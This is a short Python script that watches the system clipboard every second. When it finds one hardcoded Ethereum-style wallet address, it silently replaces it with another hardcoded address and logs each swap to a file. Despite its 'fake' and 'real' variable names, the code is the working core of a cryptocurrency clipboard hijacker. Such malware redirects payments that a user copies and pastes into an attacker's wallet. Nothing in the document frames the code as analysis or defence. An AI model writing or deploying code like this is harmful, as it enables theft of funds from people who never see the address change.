import pyperclip
import logging
import time

logging.basicConfig(filename='clipboard.log', level=logging.DEBUG)

fake_address = "0x4CAD0c012e3E438d29E2E109Ab572BD7F22aaeA8"
real_address = "0x3097c5B02E1e6C5E58F8EC64ba23d9Df472F3a2D"

while True:
    try:
        current_clipboard = pyperclip.paste()

        if fake_address in current_clipboard:
            new_clipboard = current_clipboard.replace(fake_address, real_address)
            pyperclip.copy(new_clipboard)

            logging.info(f"Replaced fake address {fake_address} with real address {real_address}")
    except Exception as e:
        logging.error(f"An error occurred: {e}")

    time.sleep(1)